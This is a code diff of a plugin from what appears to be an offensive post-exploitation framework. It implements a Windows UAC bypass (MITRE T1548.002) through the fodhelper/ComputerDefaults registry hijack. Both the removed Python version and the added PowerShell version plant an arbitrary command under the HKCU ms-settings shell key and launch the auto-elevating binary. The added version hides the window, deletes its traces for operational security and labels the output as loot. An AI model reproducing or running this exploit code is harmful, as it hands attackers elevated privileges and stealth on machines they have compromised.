@@ -1,78 +1,64 @@
-import os
+"""privilege_escalation/uac_bypass — UAC bypass via registry hijack. MITRE T1548.002"""
 import subprocess
 import time
-from fitnah.sdk.base_plugin import BasePlugin, PluginCategory
-from fitnah.sdk.result import PluginResult
+from fitnah.sdk import BasePlugin, ModuleResult
+from fitnah.sdk.schema import Param, ParamSchema
 
 
-class UacBypassPlugin(BasePlugin):
-    """
-    UAC Bypass (T1548.002)
-    Bypass User Account Control to execute commands with high integrity.
-    Methods:
-    - Fodhelper (Registry Hijack)
-    - ComputerDefaults (Registry Hijack)
-    """
+class UacBypass(BasePlugin):
+    NAME        = "uac_bypass"
+    DESCRIPTION = "Bypass UAC via fodhelper/ComputerDefaults registry hijack (T1548.002)"
+    AUTHOR      = "fitnah-team"
+    MITRE       = "T1548.002"
+    CATEGORY    = "privilege_escalation"
+    VERSION     = "2.0.0"
 
-    name = "uac_bypass"
-    category = PluginCategory.PRIVILEGE_ESCALATION
-    description = "Bypass UAC to execute commands as Administrator"
+    schema = ParamSchema().add(
+        Param("command", str, required=True,
+              help="Command to execute with elevated privileges"),
+        Param("method", str, required=False, default="fodhelper",
+              help="fodhelper | computerdefaults"),
+    )
 
-    def run(self, command: str, method: str = "fodhelper") -> PluginResult:
-        self.log_info(f"Attempting UAC bypass using method: {method}")
-        
-        if method == "fodhelper":
-            success = self._fodhelper_bypass(command)
-        elif method == "computerdefaults":
-            success = self._computerdefaults_bypass(command)
-        else:
-            return PluginResult.error(f"Unknown UAC bypass method: {method}")
+    def run(self, session, params, ctx=None) -> ModuleResult:
+        if ctx is None:
+            return ModuleResult.err("Requires live session")
 
-        if success:
-            return PluginResult.success(f"Successfully triggered UAC bypass for: {command}")
-        else:
-            return PluginResult.error(f"Failed to trigger UAC bypass using {method}")
+        command = params.get("command", "")
+        method  = params.get("method", "fodhelper").lower()
 
-    def _fodhelper_bypass(self, command: str) -> bool:
-        """
-        Bypass UAC using fodhelper.exe registry hijacking.
-        """
-        reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
-        try:
-            # 1. Create registry keys
-            subprocess.run(["reg", "add", f"HKCU\\{reg_path}", "/v", "DelegateExecute", "/t", "REG_SZ", "/f"], capture_output=True)
-            subprocess.run(["reg", "add", f"HKCU\\{reg_path}", "/ve", "/t", "REG_SZ", "/d", command, "/f"], capture_output=True)
-            
-            # 2. Trigger fodhelper.exe
-            subprocess.run(["fodhelper.exe"], capture_output=True)
-            
-            # 3. Cleanup (optional but recommended for OPSEC)
-            time.sleep(2)
-            subprocess.run(["reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f"], capture_output=True)
-            
-            return True
-        except Exception as e:
-            self.log_error(f"Fodhelper bypass failed: {e}")
-            return False
+        if not command:
+            return ModuleResult.err("command is required")
 
-    def _computerdefaults_bypass(self, command: str) -> bool:
-        """
-        Bypass UAC using ComputerDefaults.exe registry hijacking.
-        """
-        reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
-        try:
-            # 1. Create registry keys
-            subprocess.run(["reg", "add", f"HKCU\\{reg_path}", "/v", "DelegateExecute", "/t", "REG_SZ", "/f"], capture_output=True)
-            subprocess.run(["reg", "add", f"HKCU\\{reg_path}", "/ve", "/t", "REG_SZ", "/d", command, "/f"], capture_output=True)
-            
-            # 2. Trigger ComputerDefaults.exe
-            subprocess.run(["ComputerDefaults.exe"], capture_output=True)
-            
-            # 3. Cleanup
-            time.sleep(2)
-            subprocess.run(["reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f"], capture_output=True)
-            
-            return True
-        except Exception as e:
-            self.log_error(f"ComputerDefaults bypass failed: {e}")
-            return False
+        ps = self._build_ps(command, method)
+        r  = ctx.ps(ps)
+        if r["status"] != "ok":
+            return ModuleResult.err(f"UAC bypass failed: {r['output']}")
+        return ModuleResult.ok(data=r["output"], loot_kind="uac_bypass")
+
+    @staticmethod
+    def _build_ps(command: str, method: str) -> str:
+        trigger = "fodhelper.exe" if method == "fodhelper" else "ComputerDefaults.exe"
+        return f"""
+$results = @()
+$results += '[*] UAC bypass — {method} registry hijack (T1548.002)'
+$regPath = "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command"
+try {{
+    New-Item -Path $regPath -Force | Out-Null
+    Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
+    Set-ItemProperty -Path $regPath -Name "(default)"       -Value "{command}" -Force
+    $results += "[+] Registry keys written: $regPath"
+
+    Start-Process -FilePath "{trigger}" -WindowStyle Hidden
+    $results += "[+] Triggered {trigger}"
+
+    Start-Sleep -Seconds 2
+
+    # Cleanup
+    Remove-Item -Path "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
+    $results += "[+] Registry cleanup done"
+}} catch {{
+    $results += "[-] $($_)"
+}}
+$results -join "`n"
+"""
